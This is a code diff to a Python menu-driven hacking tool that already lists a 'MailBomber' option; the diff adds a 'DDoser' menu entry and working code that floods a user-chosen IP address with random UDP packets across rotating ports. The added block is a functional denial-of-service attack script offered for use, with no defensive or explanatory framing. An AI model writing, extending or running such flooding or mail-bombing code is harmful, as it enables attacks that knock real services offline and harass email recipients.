@@ -6,6 +6,7 @@ import sys
 import smtplib
 import getpass
 import time
+import random
 
 while True:
     print(" ** Which one Do you want?")
@@ -13,6 +14,7 @@ while True:
     print(" ** 2.BTC Price  **")
     print(" ** 3.Whois      **")
     print(" ** 4.MailBomber **")
+    print(" ** 5.DDoser     **")
     print(" ** 0.Exit       **")
     men = int(input(" ))=>> "))
     if men == 1:
@@ -64,6 +66,19 @@ while True:
             print (' ** [-] Canceled')
         except smtplib.SMTPAuthenticationError:
             print ('\n ** [!] Allow access to less secure apps on your gmail account. https://www.google.com/settings/security/lesssecureapps')
+    elif men == 5:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        bytes = random._urandom(1490)
+        ip = input("  **  IP Target  : ")
+        port = int(input("  **  Port       : "))
+        number = int(input("  **  Number     : "))
+        for sent in range(number):
+             sock.sendto(bytes, (ip,port))
+             port = port + 1
+             if sent % 100 == 0:
+                  print( "  **  Sent %s packet to %s :)"%(sent,ip))
+             if port == 65534:
+                  port = 1
     elif men == 0:
         break;
     ose = input("\n\n\t** Enter a key to exit .")
